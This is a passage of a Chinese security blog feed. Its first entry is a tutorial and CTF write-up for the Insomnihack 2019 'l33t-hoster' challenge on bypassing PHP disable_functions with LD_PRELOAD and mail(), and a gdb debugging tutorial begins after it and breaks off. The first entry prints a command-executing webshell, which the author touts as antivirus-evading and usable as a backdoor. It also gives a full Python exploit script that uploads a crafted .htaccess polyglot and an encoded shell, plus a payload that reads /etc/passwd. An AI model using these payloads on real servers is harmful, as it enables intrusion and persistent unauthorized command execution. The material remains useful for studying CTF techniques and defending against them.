    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当千辛万苦拿到的webshell居然无法执行系统命令无疑是令人抓狂的。那么我们该如何绕过它呢？这里主要以Insomnihack Teaser 2019 Web题 l33t-hoster来讲解，本文主要讲通过LD_PRELOAD 来达到bypass的目的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>相信大家都知道PHP.ini中有的php控制器functions_disable会禁用一些危险的系统函数防止被黑客攻击。例如<code>system（）</code>或<code>exec（）</code>或<code>shell_exec（）</code>，甚至我们不太知道的函数，如<code>dl（）</code><br>那么该怎么办呢？我们可以通过一定手法进行bypass disable_functions<br>有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><p>一.利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><p>我们可以通过PHP中mail（）函数使用LD_PRELOAD变量注入一些恶意的应用程序中比如getuid（）<br>提起LD_PRELOAD变量先说明下程序的链接，程序的链接分为静态链接和动态链接，动态链接程序运行时动态地载入函数库，但一旦我们采取动态链接我们的程序就有被‘劫持’的可能<br>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker）。很明显通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p><p>而mail（）函数，mail（）函数会在/ usr / sbin / sendmail里面启动，而我们的脚本将会调用一些系统函数（API如getuid（）），我们可以通过LD_PRELOAD来注入一些恶意代码。</p><p>所以这里我们的bypass思路很明显了使用mail（）函数通过LD_PRELOAD变量覆盖，达到执行系统函数的目的。<br>payload（它是免杀的哦，可以当作小马使用）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>当然还要再辅助一个.so文件才行具体请看</p><blockquote><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/README.md" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/README.md</a></p></blockquote><p>举个例子前段时间的Insomnihack Teaser 2019 Web题 l33t-hoster </p><h2 id="l33t-hoster-WriteUp-bypass-disable-function"><a href="#l33t-hoster-WriteUp-bypass-disable-function" class="headerlink" title="l33t-hoster WriteUp bypass disable function"></a>l33t-hoster WriteUp bypass disable function</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&quot;source&quot;]))</span><br><span class="line">    die(highlight_file(__FILE__));</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if (!isset($_SESSION[&quot;home&quot;])) &#123;</span><br><span class="line">    $_SESSION[&quot;home&quot;] = bin2hex(random_bytes(20));</span><br><span class="line">&#125;</span><br><span class="line">$userdir = &quot;images/&#123;$_SESSION[&quot;home&quot;]&#125;/&quot;;</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$disallowed_ext = array(</span><br><span class="line">    &quot;php&quot;,</span><br><span class="line">    &quot;php3&quot;,</span><br><span class="line">    &quot;php4&quot;,</span><br><span class="line">    &quot;php5&quot;,</span><br><span class="line">    &quot;php7&quot;,</span><br><span class="line">    &quot;pht&quot;,</span><br><span class="line">    &quot;phtm&quot;,</span><br><span class="line">    &quot;phtml&quot;,</span><br><span class="line">    &quot;phar&quot;,</span><br><span class="line">    &quot;phps&quot;,);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    if ($_FILES[&apos;image&apos;][&apos;error&apos;] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        die(&quot;yuuuge fail&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $tmp_name = $_FILES[&quot;image&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name = $_FILES[&quot;image&quot;][&quot;name&quot;];</span><br><span class="line">    $parts = explode(&quot;.&quot;, $name);</span><br><span class="line">    $ext = array_pop($parts);</span><br><span class="line"></span><br><span class="line">    if (empty($parts[0])) &#123;</span><br><span class="line">        array_shift($parts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (count($parts) === 0) &#123;</span><br><span class="line">        die(&quot;lol filename is empty&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (in_array($ext, $disallowed_ext, TRUE)) &#123;</span><br><span class="line">        die(&quot;lol nice try, but im not stupid dude...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $image = file_get_contents($tmp_name);</span><br><span class="line">    if (mb_strpos($image, &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">        die(&quot;why would you need php in a pic.....&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!exif_imagetype($tmp_name)) &#123;</span><br><span class="line">        die(&quot;not an image.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $image_size = getimagesize($tmp_name);</span><br><span class="line">    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) &#123;</span><br><span class="line">        die(&quot;lol noob, your pic is not l33t enough&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = implode(&quot;.&quot;, $parts);</span><br><span class="line">    move_uploaded_file($tmp_name, $userdir . $name . &quot;.&quot; . $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;;</span><br><span class="line">foreach(glob($userdir . &quot;*&quot;) as $file) &#123;</span><br><span class="line">    echo &quot;&lt;li&gt;&lt;a href=&apos;$file&apos;&gt;$file&lt;/a&gt;&lt;/li&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/ul&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Upload your pics!&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;?&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=upload&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.这道题禁止php后缀的文件，或者是同意的后缀文件上传</span><br><span class="line">2.上传必须满足getimagesize（）函数</span><br><span class="line">3.图片必须是大小为1337x1337的有效图像</span><br><span class="line">4.上传的文件不能包含&lt;?。</span><br></pre></td></tr></table></figure><p>这里并没有禁用<code>.htaccess</code>，我们可以通过上传<code>.htaccess</code>文件构造，使一种我们想要的后缀格式解析成php。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value是.htaccess文件中可以用的指令之一。该指令允许我们使用PHP_INI_PERDIR标志修改此处列表里的任何设置。</span><br><span class="line"></span><br><span class="line">在这些设置中，有个auto_append_file，它允许我们在请求PHP文件时添加或包含一个文件。后来发现，auto_append_file还允许各种包装器，如php://。</span><br></pre></td></tr></table></figure></p><p>我们可以构造<code>.htaccess</code>文件内容为，将以<code>.corb3nik</code>为文件后缀的文件解析为php文件，并且当我们发起一个php文件请求时返回我们需要的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .corb3nik</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span><br></pre></td></tr></table></figure></p><p>现在我们需要构造一个满足getimagesize()的<code>.htaccess</code>文件，<br>在<code>.htaccess</code>文件中#与<code>\x00</code>为注释符号<br>所以我们只需要构造一个满足二进制头为<code>\x00</code>且满足getimagesize函数的文件即可，需要满足如下文件格式<br><img src="https://i.imgur.com/NJ4iKDC.png" alt=""><br>我们可以构造.wbmp文件<br>并以如下作为开头，我们便可以构造任意的脚本了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000 8a39 8a39</span><br></pre></td></tr></table></figure></p><p>如何绕过<br><code>&lt;?</code> 的限制呢？<br>1.使用base64编码<br>2.使用php_value zend.script_encoding “UTF-7” 使用utf-7进行绕过<br>所以我们就可以通过类似以下脚本，配合一个.so文件就可以执行我么想要的命令了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">VALID_WBMP = b&quot;\x00\x00\x8a\x39\x8a\x39\x0a&quot;</span><br><span class="line">URL = &quot;xxx&quot;</span><br><span class="line">RANDOM_DIRECTORY = &quot;d53f37bed6ba5becd1993231b9a07593d6939b2a&quot;</span><br><span class="line"></span><br><span class="line">COOKIES = &#123;</span><br><span class="line">    &quot;PHPSESSID&quot; : &quot;btvfccrafpo65jd9oa64u26bf2&quot;&#125;</span><br><span class="line"></span><br><span class="line">def upload_content(name, content):</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;image&quot; : (name, content, &apos;image/png&apos;),</span><br><span class="line">        &quot;upload&quot; : (None, &quot;Submit Query&quot;, None)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(URL, files=data, cookies=COOKIES)</span><br><span class="line"></span><br><span class="line">HT_ACCESS = VALID_WBMP + b&quot;&quot;&quot;</span><br><span class="line">AddType application/x-httpd-php .corb3nik</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">TARGET_FILE = VALID_WBMP + b&quot;AAA&quot; + base64.b64encode(b&quot;&quot;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line">    $cmd = &quot;pwd&quot;;</span><br><span class="line">    $out_path = &quot;_0utput.txt&quot;;</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">    $so_path = &quot;/var/www/bypass_disablefunc_x64.so&quot;;</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line">upload_content(&quot;..htaccess&quot;, HT_ACCESS)</span><br><span class="line">upload_content(&quot;shell.corb3nik&quot;, TARGET_FILE)</span><br><span class="line">upload_content(&quot;trigger.corb3nik&quot;, VALID_WBMP)</span><br><span class="line">response = requests.post(URL + &quot;/images/&quot; + RANDOM_DIRECTORY + &quot;/trigger.corb3nik&quot;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure></p><p>这里还有一个问题，我们该如何上传so文件呢？我们时不可以构造满足函数getimagesize（）的so文件的，经过发现我们可以找到<code>move_uploaded_file</code>并没有被禁用，于是我们可以构造一个文件上传的PHP文件<br>如下，我们便可以上传so文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; form  method = “ POST ”  action = “ upl.asp ”  enctype = “ multipart / form-data ” &gt;</span><br><span class="line">    &lt; input  type = “ file ”  name = “ image ” &gt;</span><br><span class="line">&lt; input  type = “ text ”  name = “ name ” &gt;</span><br><span class="line">    &lt; input  type = “ submit ”  name = upload &gt;</span><br><span class="line">&lt;/ form &gt;</span><br></pre></td></tr></table></figure></p><p>通过这样我们就可以执行任意我们想要的系统命令了。<br>当然我们也可以直接上传一个文件<br>通过如下payload也可以造成相同效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($_FILES[&apos;evil&apos;][&apos;tmp_name&apos;], &apos;/tmp/evil.so&apos;);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其实我们可以构造类似这样的payload</span><br><span class="line">PHP的mail()函数调用execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], ...)。 但是貌似这样时没有回显的。</span><br></pre></td></tr></table></figure><blockquote><p>当然我个人是认为smod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制也是可以的。</p></blockquote><p>有关文件上传的函数请查阅函数 <code>is_uploaded_file()</code> 和 <code>move_uploaded_file()</code> 以获取进一步的信息。以下范例处理由表单提供的文件上传。</p><p>附加备忘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看进程调用系统函数明细。linux 创建新进程的过程较为复杂，我关心进程加载了哪些共享对象、可能调用哪些 API、实际调用了哪些 API。比如，运行 /usr/bin/id，通过 ldd 可查看系统为其加载的共享对象：</span><br></pre></td></tr></table></figure></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">https://blog.csdn.net/haoel/article/details/1602108</a><br><a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#</a><br><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a><br><a href="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">https://blog.csdn.net/haoel/article/details/1602108</a></p><p><a href="https://xz.aliyun.com/t/3941#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3941#toc-2</a><br><a href="https://blog.mythsman.com/2015/12/01/1/" target="_blank" rel="noopener">https://blog.mythsman.com/2015/12/01/1/</a><br><a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md" target="_blank" rel="noopener">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md</a><br><a href="http://php.net/manual/zh/features.file-upload.post-method.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.file-upload.post-method.php</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/80235811" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/80235811</a><br><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      bypass disable function的学习与实践
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="bypass" scheme="https://museljh.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>从零开始学习使用gdb调试PHP源码</title>
    <link href="https://museljh.github.io/2019/03/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95PHP%E6%BA%90%E7%A0%81/"/>
    <id>https://museljh.github.io/2019/03/29/从零开始学习使用gdb调试PHP源码/</id>
    <published>2019-03-29T06:19:25.000Z</published>
    <updated>2019-03-29T06:36:51.357Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具；</p><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">b/break ：设置断点</span><br><span class="line">delete ：清除断点</span><br><span class="line">continue ：继续终止的程序</span><br><span class="line">run/r ：运行程序</span><br><span class="line">step/s ：单步运行，进入函数</span><br><span class="line">next/n ：单步运行，不进入函数</span><br><span class="line">list/l ：显示源代码，每次显示10行</span><br><span class="line">bt/backtrace ：显示栈中的内容</span><br><span class="line">print/p ：显示queue中的内容</span><br><span class="line">kill ：终止正在调试的程序</span><br><span class="line">file ：装入将要调试的文件</span><br><span class="line">info variables 命令将打印出所有程序变量的值</span><br><span class="line">info locals 命令时，gdb 会打印出当前帧中的局部变量</span><br><span class="line">bt 程序“调用堆栈”是当前函数之前的所有已调用函数的列表（包括当前函数）</span><br><span class="line">q ：退出gdb</span><br></pre></td></tr></table></figure><h2 id="gdb调试入门"><a href="#gdb调试入门" class="headerlink" title="gdb调试入门"></a>gdb调试入门</h2><h3 id="简单的使用gdb分析程序错误"><a href="#简单的使用gdb分析程序错误" class="headerlink" title="简单的使用gdb分析程序错误"></a>简单的使用gdb分析程序错误</h3><p>将以下样本代码保存成.c文件格式,这段程序意思为循环十次并输出，使用<code>gcc -g eg1.c -o eg1</code> 进行编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int wib(int no1, int no2)</span><br><span class="line">&#123;</span><br><span class="line">  int result, diff;</span><br><span class="line">  diff = no1 - no2;</span><br><span class="line">  result = no1 / diff;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  int value, div, result, i, total;</span><br><span class="line">  value = 10;</span><br><span class="line">  div = 6;</span><br><span class="line">  total = 0;</span><br><span class="line">  for(i = 0; i &lt; 10; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    result = wib(value, div);</span><br><span class="line">    total += result;</span><br><span class="line">    div++;</span><br><span class="line">    value--;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;%d wibed by %d equals %d\n&quot;, value, div, total);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当我们直接执行<code>./eg1</code>，时候会爆出<code>Floating point exception</code>错误，我们需要使用gdb调试来寻找这个错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~/gbk_test# ./eg1 </span><br><span class="line">Floating point exception</span><br></pre></td></tr></table></figure></p><p>我们将使用<code>gdb eg1</code>启动gdb（没有安装的需要apt-get install gdb)，启动后我们直接使用run命令运行我们的程序，如下可以看到在第6行的时候发生了一个错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGFPE, Arithmetic exception.</span><br><span class="line">0x000000000040053d in wib (no1=8, no2=8) at eg1.c:6</span><br><span class="line">6  result = no1 / diff;</span><br></pre></td></tr></table></figure></p><p>我们使用<code>print no1</code> <code>print diff</code> 来打印出这两个变量的值，可以看出出错的原因是因为diff值为0导致算术异常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print no1 </span><br><span class="line">$1 = 8</span><br><span class="line">(gdb) print diff</span><br><span class="line">$2 = 0</span><br></pre></td></tr></table></figure></p><p>当发现异常后，假若我们使用continue命令，程序将继续执行下去，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program terminated with signal SIGFPE, Arithmetic exception.</span><br><span class="line">The program no longer exists.</span><br></pre></td></tr></table></figure></p><h3 id="使用断点进行分析"><a href="#使用断点进行分析" class="headerlink" title="使用断点进行分析"></a>使用断点进行分析</h3><p>我们可以使用break命令进行断点，比如我们想知道main函数中到底是什么导致了错误发生我们可以使用break main ， 并且我们可以使用list main 来查看main 附近10 行代码的具体情况 ，使用回车可以继续查看接下来的10行代码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">15  for(i = 0; i &lt; 10; i++)</span><br><span class="line">16  &#123;</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">18    total += result;</span><br><span class="line">19    div++;</span><br><span class="line">20    value--;</span><br></pre></td></tr></table></figure></p><p>我们可以看到，在第17行的时候我们使用了wib 函数 ，于是我们使用break 17 来设置断点 （ 当然任何我们感兴趣的函数我们都可以设置断点进行查看）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break  17 </span><br><span class="line">Breakpoint 2 at 0x400575: file eg1.c, line 17.</span><br></pre></td></tr></table></figure></p><p>我们可以使用info break 来查看当前设置的断点情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info break</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x0000000000400557 in main at eg1.c:12</span><br><span class="line">2       breakpoint     keep y   0x0000000000400575 in main at eg1.c:17</span><br></pre></td></tr></table></figure></p><p>我们也可以使用<code>delete 1</code> 删除第一个断点（<code>可以使用命令 &#39;disable &lt;breakpoint number&gt;&#39;、&#39;enable &lt;breakpoint number&gt;&#39; 或 &#39;delete &lt;breakpoint number&gt;&#39; 来禁用、启用和彻底删除断点，</code>），再次查看的时候我们可以看到断点1 已经被我们删除成功了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 